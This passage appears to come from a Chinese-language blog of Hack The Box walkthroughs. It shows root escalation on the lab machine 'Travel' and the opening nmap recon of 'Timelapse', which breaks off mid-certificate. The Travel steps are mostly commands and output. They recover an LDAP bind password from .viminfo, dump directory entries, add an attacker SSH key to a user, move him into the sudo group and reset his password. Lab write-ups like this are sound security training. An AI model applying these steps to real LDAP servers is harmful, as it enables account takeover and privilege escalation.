class="hljs-number">68</span>GB<br>  <span class="hljs-attribute">Memory</span> usage:                     <span class="hljs-number">12</span>%<br>  <span class="hljs-attribute">Swap</span> usage:                       <span class="hljs-number">0</span>%<br>  <span class="hljs-attribute">Processes</span>:                        <span class="hljs-number">199</span><br>  <span class="hljs-attribute">Users</span> logged in:                  <span class="hljs-number">0</span><br>  <span class="hljs-attribute">IPv4</span> address for br-<span class="hljs-number">836575</span>a2ebbb: <span class="hljs-number">172.20.0.1</span><br>  <span class="hljs-attribute">IPv4</span> address for br-<span class="hljs-number">8</span>ec6dcae5ba1: <span class="hljs-number">172.30.0.1</span><br>  <span class="hljs-attribute">IPv4</span> address for docker0:         <span class="hljs-number">172.17.0.1</span><br>  <span class="hljs-attribute">IPv4</span> address for eth0:            <span class="hljs-number">10.10.10.189</span><br><br><span class="hljs-attribute">lynik</span>-admin@travel:~$ <br></code></pre></td></tr></table></figure><p>user.txt:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls<br>user.txt<br>lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt <br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> lynik-<span class="hljs-symbol">admin:</span> <br><span class="hljs-title class_">Sorry</span>, user lynik-admin may <span class="hljs-keyword">not</span> run sudo on travel.<br>lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure><p>首先，有一个<code>.ldaprc</code>文件。这是一个定义用户如何连接到 LDAP 的文件：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lynik-admin@travel:~$ ls -<span class="hljs-selector-tag">a</span><br>.  ..  <span class="hljs-selector-class">.bash_history</span>  <span class="hljs-selector-class">.bash_logout</span>  <span class="hljs-selector-class">.bashrc</span>  <span class="hljs-selector-class">.cache</span>  <span class="hljs-selector-class">.ldaprc</span>  <span class="hljs-selector-class">.profile</span>  user<span class="hljs-selector-class">.txt</span>  <span class="hljs-selector-class">.viminfo</span><br>lynik-admin@travel:~$ cat <span class="hljs-selector-class">.ldaprc</span> <br>HOST ldap<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>BASE dc=travel,dc=htb<br>BINDDN cn=lynik-admin,dc=travel,dc=htb<br></code></pre></td></tr></table></figure><p>该机器还有另一个容器在运行 LDAP 服务器，如主机文件中所示：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lynik</span>-admin@travel:~$ ip neighoor<br><span class="hljs-attribute">Object</span> <span class="hljs-string">&quot;neighoor&quot;</span> is unknown, try <span class="hljs-string">&quot;ip help&quot;</span>.<br><span class="hljs-attribute">lynik</span>-admin@travel:~$ ip neighbor<br><span class="hljs-attribute">172</span>.<span class="hljs-number">30</span>.<span class="hljs-number">0</span>.<span class="hljs-number">80</span> dev br-<span class="hljs-number">8</span>ec6dcae5ba1 lladdr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">1</span>e:<span class="hljs-number">00</span>:<span class="hljs-number">50</span> STALE<br><span class="hljs-attribute">172</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span> dev br-<span class="hljs-number">836575</span>a2ebbb lladdr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">0</span>a REACHABLE<br><span class="hljs-attribute">172</span>.<span class="hljs-number">30</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span> dev br-<span class="hljs-number">8</span>ec6dcae5ba1 lladdr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">1</span>e:<span class="hljs-number">00</span>:<span class="hljs-number">0</span>a STALE<br><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">2</span> dev eth0 lladdr <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:<span class="hljs-number">48</span>:<span class="hljs-number">25</span> REACHABLE<br><span class="hljs-attribute">lynik</span>-admin@travel:~$ cat /etc/hosts<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> travel<br><span class="hljs-attribute">172</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span> ldap.travel.htb<br></code></pre></td></tr></table></figure><p>在主目录中，该<code>.viminfo</code>文件包含一个密码：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;&quot;</span><span class="hljs-number">1</span>     LINE    <span class="hljs-number">0</span><br>        BINDPW Theroadlesstraveled<br><span class="hljs-string">|3,1,1,1,1,0,1587670528,&quot;</span>BINDPW Theroadlesstraveled<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>我可以使用此信息连接到 LDAP 并转储信息。有很多，但是我可以知道：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-comment"># lynik-admin, travel.htb</span><br><span class="hljs-attribute">dn</span>: cn=lynik-admin,dc=travel,dc=htb<br><span class="hljs-attribute">description</span>: LDAP administrator<br><span class="hljs-attribute">objectClass</span>: simpleSecurityObject<br><span class="hljs-attribute">objectClass</span>: organizationalRole<br><span class="hljs-attribute">cn</span>: lynik-admin<br><span class="hljs-attribute">userPassword</span>:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ==<br></code></pre></td></tr></table></figure><p>我目前的用户是在LADP管理员。我要从 LDAP 的列表中挑选一个用户来处理。首先，我要在他们的个人资料中添加一个 SSH 密钥，我可以在本地生成一个密钥对：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keygen -t rsa -m PEM -b <span class="hljs-number">4096</span> -C <span class="hljs-string">&quot;root@Android&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">─<span class="hljs-comment"># cat id_rsa.pub   </span><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDI6MJo7INE5B1s641uPD0uzTlr9J99MfL9wIHzS+tJfEL13Brot<span class="hljs-regexp">/vFBni45xhb8iAOmpOfkwoXfqLnixU+nBULMXBV18Otx003nYZqm3MsvE2ts7nq+FS4K+O7ZpROpywEXjuHLhdJfEsGb8crE5DYmtOIfRPkBwfBeL8Su/</span>VebZ2PAWqRtb7ONzfShLRhe3PfFiJefvo8iDFZz9TLBsjPuEx9VKi9ovkjKpawIztd2c63VOCXz2Qh1kJs3E1dFxLHDb2ddKV00gc3xRCrmKxhSV6FXPz93xvUYyDa9AZzqrxcnZS7Br+iOGiaNYfLkXLcCCTtrggGjgnsp2mLmGAE<span class="hljs-regexp">/cYrmSWhxW0Mxb0czpL3GtafI6BVTewoXSs/</span>oOMdTJ2We<span class="hljs-regexp">/2UEwnknpEbvIyBPC5LR/</span>jgI0QCaaTzYb7GHedKDBU0dxx42BsRU+VG86vrhrF2SsCDoO<span class="hljs-regexp">/fnnQR73sbb6kjZv9TCEwQWXp9nkeDez3KpfnN+R2H4DHshmB3cCGXfUJfIeA4qYuwvywvqi96hJtv3M5oH2g+ljJ6CI9MIWA7OVjIruJAocW9fMbUYThBVxur5JGK7Ofah/</span>vFQCO0+<span class="hljs-number">6</span>MTDaV4Lx92JKKXsHgNEtOPi0gSlTgVb9lV4PY5OK2cBs2LPWXk/s9Z8nzktekII8QuTsfgPjcGJkaOBfYC5TXtpQ== root@Android<br></code></pre></td></tr></table></figure><p>我将创建一个文件来添加我为 johnny 制作的密钥并将其另存为&#x2F;dev&#x2F;shm&#x2F;add_ssh_to_johnny.ldif：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/dev/</span>shm/add_ssh_to_johnny.ldif<br></code></pre></td></tr></table></figure><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">dn</span>: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb<br><span class="hljs-attribute">changeType</span>: modify<br><span class="hljs-attribute">add</span>: objectClass<br><span class="hljs-attribute">objectClass</span>: ldapPublicKey<br><span class="hljs-literal">-</span><br><span class="hljs-attribute">add</span>: sshPublicKey<br><span class="hljs-attribute">sshPublicKey</span>: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDI6MJo7INE5B1s641uPD0uzTlr9J99MfL9wIHzS+tJfEL13Brot/vFBni45xhb8iAOmpOfkwoXfqLnixU+nBULMXBV18Otx003nYZqm3MsvE2ts7nq+FS4K+O7ZpROpywEXjuHLhdJfEsGb8crE5DYmtOIfRPkBwfBeL8Su/VebZ2PAWqRtb7ONzfShLRhe3PfFiJefvo8iDFZz9TLBsjPuEx9VKi9ovkjKpawIztd2c63VOCXz2Qh1kJs3E1dFxLHDb2ddKV00gc3xRCrmKxhSV6FXPz93xvUYyDa9AZzqrxcnZS7Br+iOGiaNYfLkXLcCCTtrggGjgnsp2mLmGAE/cYrmSWhxW0Mxb0czpL3GtafI6BVTewoXSs/oOMdTJ2We/2UEwnknpEbvIyBPC5LR/jgI0QCaaTzYb7GHedKDBU0dxx42BsRU+VG86vrhrF2SsCDoO/fnnQR73sbb6kjZv9TCEwQWXp9nkeDez3KpfnN+R2H4DHshmB3cCGXfUJfIeA4qYuwvywvqi96hJtv3M5oH2g+ljJ6CI9MIWA7OVjIruJAocW9fMbUYThBVxur5JGK7Ofah/vFQCO0+6MTDaV4Lx92JKKXsHgNEtOPi0gSlTgVb9lV4PY5OK2cBs2LPWXk/s9Z8nzktekII8QuTsfgPjcGJkaOBfYC5TXtpQ== root@Android<br></code></pre></td></tr></table></figure><p>然后用ldapadd来变更改动：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ldapadd -D <span class="hljs-string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span> -w <span class="hljs-title class_">Theroadlesstraveled</span> -f /dev/shm/add_ssh_to_johnny.ldif <br>modifying entry <span class="hljs-string">&quot;uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span><br></code></pre></td></tr></table></figure><p>我可以ssh链接：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">─# ssh -i id_rsa johnny@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span>                  <br>Creating directory <span class="hljs-string">&#x27;/home@TRAVEL/johnny&#x27;</span>.<br>Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span> LTS (GNU/Linux <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-26</span>-generic x86_64)<br><br>  <span class="hljs-keyword">System</span> information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Tue <span class="hljs-number">12</span> Apr <span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">10</span> AM UTC<br><br>  <span class="hljs-keyword">System</span> <span class="hljs-keyword">load</span>:                      <span class="hljs-number">0.12</span><br>  <span class="hljs-keyword">Usage</span> <span class="hljs-keyword">of</span> /:                       <span class="hljs-number">46.1</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">15.68</span>GB<br>  Memory <span class="hljs-keyword">usage</span>:                     <span class="hljs-number">13</span>%<br>  Swap <span class="hljs-keyword">usage</span>:                       <span class="hljs-number">0</span>%<br>  Processes:                        <span class="hljs-number">202</span><br>  Users <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span>:                  <span class="hljs-number">1</span><br>  IPv4 address <span class="hljs-keyword">for</span> br<span class="hljs-number">-836575</span>a2ebbb: <span class="hljs-number">172.20</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>  IPv4 address <span class="hljs-keyword">for</span> br<span class="hljs-number">-8</span>ec6dcae5ba1: <span class="hljs-number">172.30</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>  IPv4 address <span class="hljs-keyword">for</span> docker0:         <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>  IPv4 address <span class="hljs-keyword">for</span> eth0:            <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span><br><br>          *** Travel.HTB News Flash ***<br>We are currently experiencing <span class="hljs-keyword">some</span> delay <span class="hljs-keyword">in</span> <span class="hljs-keyword">domain</span><br><span class="hljs-keyword">replication</span> times <span class="hljs-keyword">of</span> about <span class="hljs-number">3</span><span class="hljs-number">-5</span> seconds. Sorry <span class="hljs-keyword">for</span><br>the inconvenience. Kind Regards, <span class="hljs-keyword">admin</span><br><br><br>The programs included <span class="hljs-keyword">with</span> the Ubuntu <span class="hljs-keyword">system</span> are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/<span class="hljs-keyword">share</span>/doc<span class="hljs-comment">/*/copyright.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="hljs-comment">applicable law.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">johnny@travel:~$</span><br></code></pre></td></tr></table></figure><p>虽然它还是一个低权限用户，但是不着急：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> change_johnny_to_sudo.ldif<br></code></pre></td></tr></table></figure><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">dn</span>: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb<br><span class="hljs-attribute">changeType</span>: modify<br><span class="hljs-attribute">replace</span>: gidNumber<br><span class="hljs-attribute">gidNumber</span>: 27<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ldapadd -D <span class="hljs-string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span> -w <span class="hljs-title class_">Theroadlesstraveled</span> -f change_johnny_to_sudo.ldif<br>modifying entry <span class="hljs-string">&quot;uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span><br></code></pre></td></tr></table></figure><p>现在johnny在27组：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>getent passwd | grep johnny<br><span class="hljs-symbol">johnny:</span>*<span class="hljs-symbol">:</span><span class="hljs-number">5004</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span><span class="hljs-symbol">:Johnny</span> <span class="hljs-symbol">Miller:</span>/home<span class="hljs-variable">@TRAVEL</span>/<span class="hljs-symbol">johnny:</span>/bin/bash<br></code></pre></td></tr></table></figure><p>可以SSH登录：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">└─# ssh -i id_rsa johnny@10.10.10.189<br>Welcome <span class="hljs-keyword">to</span> Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)<br><br> <span class="hljs-built_in"> System </span>information as of Tue 12 Apr 2022 12:07:16 PM UTC<br><br> <span class="hljs-built_in"> System </span>load:                      0.0<br>  Usage of /:                       46.1% of 15.68GB<br>  Memory usage:                     13%<br>  Swap usage:                       0%<br>  Processes:                        203<br> <span class="hljs-built_in"> Users </span>logged <span class="hljs-keyword">in</span>:                  1<br>  IPv4<span class="hljs-built_in"> address </span><span class="hljs-keyword">for</span> br-836575a2ebbb: 172.20.0.1<br>  IPv4<span class="hljs-built_in"> address </span><span class="hljs-keyword">for</span> br-8ec6dcae5ba1: 172.30.0.1<br>  IPv4<span class="hljs-built_in"> address </span><span class="hljs-keyword">for</span> docker0:         172.17.0.1<br>  IPv4<span class="hljs-built_in"> address </span><span class="hljs-keyword">for</span> eth0:            10.10.10.189<br><br>Last login: Tue Apr 12 11:55:10 2022 <span class="hljs-keyword">from</span> 10.10.16.8<br><span class="hljs-keyword">To</span> <span class="hljs-built_in">run</span> a command as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>johnny@travel:~$ sudo su -<br>[sudo] password <span class="hljs-keyword">for</span> johnny: <br></code></pre></td></tr></table></figure><p>但是没有密码，最后一个 LDAP 模块 ，为 johnny 添加密码：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>vim .ldif<br></code></pre></td></tr></table></figure><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">dn</span>: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb<br><span class="hljs-attribute">changeType</span>: modify<br><span class="hljs-attribute">replace</span>: userPassword<br><span class="hljs-attribute">userPassword</span>: whoami<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lynik-admin<span class="hljs-variable">@travel</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ldapadd -D <span class="hljs-string">&quot;cn=lynik-admin,dc=travel,dc=htb&quot;</span> -w <span class="hljs-title class_">Theroadlesstraveled</span> -f .ldif modifying entry <span class="hljs-string">&quot;uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb&quot;</span><br></code></pre></td></tr></table></figure><p>然后再ssh登录johnny：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs css">└─# ssh -<span class="hljs-selector-tag">i</span> id_rsa johnny<span class="hljs-keyword">@10</span>.10.10.189<br>Welcome to Ubuntu <span class="hljs-number">20.04</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>-generic x86_64)<br><br>  System information as of Tue <span class="hljs-number">12</span> Apr <span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">07</span>:<span class="hljs-number">16</span> PM UTC<br><br>  System <span class="hljs-attribute">load</span>:                      <span class="hljs-number">0.0</span><br>  Usage of /:                       <span class="hljs-number">46.1%</span> of <span class="hljs-number">15.68</span>GB<br>  Memory <span class="hljs-attribute">usage</span>:                     <span class="hljs-number">13%</span><br>  Swap <span class="hljs-attribute">usage</span>:                       <span class="hljs-number">0%</span><br>  <span class="hljs-attribute">Processes</span>:                        <span class="hljs-number">203</span><br>  Users logged <span class="hljs-attribute">in</span>:                  <span class="hljs-number">1</span><br>  IPv4 address for br-<span class="hljs-number">836575</span>a2<span class="hljs-attribute">ebbb</span>: <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span><br>  IPv4 address for br-<span class="hljs-number">8</span>ec6dcae5ba1: <span class="hljs-number">172.30</span>.<span class="hljs-number">0.1</span><br>  IPv4 address for docker0:         <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span><br>  IPv4 address for eth0:            <span class="hljs-number">10.10</span>.<span class="hljs-number">10.189</span><br><br>Last <span class="hljs-attribute">login</span>: Tue Apr <span class="hljs-number">12</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">10</span> <span class="hljs-number">2022</span> from <span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span><br>To run a command as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> for details.<br><br>johnny@<span class="hljs-attribute">travel</span>:~$ sudo su -<br>[sudo] password for <span class="hljs-attribute">johnny</span>: <br>root@<span class="hljs-attribute">travel</span>:~# <br>root@<span class="hljs-attribute">travel</span>:~# cat /root/root.txt <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Timelapse</title>
    <link href="/post/HackTheBox-Timelapse.html"/>
    <url>/post/HackTheBox-Timelapse.html</url>
    
    <content type="html"><![CDATA[<p>Recon:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Mon Jun  6 13:23:31 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt -T4 10.10.11.152</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.152<br>Host is up (0.19s latency).<br>Not shown: 65517 filtered tcp ports (no-response)<br>PORT      STATE SERVICE           VERSION<br>53/tcp    open  domain            Simple DNS Plus<br>88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-06-06 13:29:27Z)<br>135/tcp   open  msrpc             Microsoft Windows RPC<br>139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn<br>389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ldapssl?<br>3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)<br>3269/tcp  open  globalcatLDAPssl?<br>5986/tcp  open  ssl<br>| ssl-cert: OpenSSL required to parse certificate.<br>| -----BEGIN CERTIFICATE-----<br>| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd<br>| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN<br>| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi<br>| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO<br>| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX<br>| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui<br>| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5<br>| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg<br>| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB<br>| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV<br>| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y<br>| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU<br>| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H<br>| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK<br>| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE<br>| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh<br>| 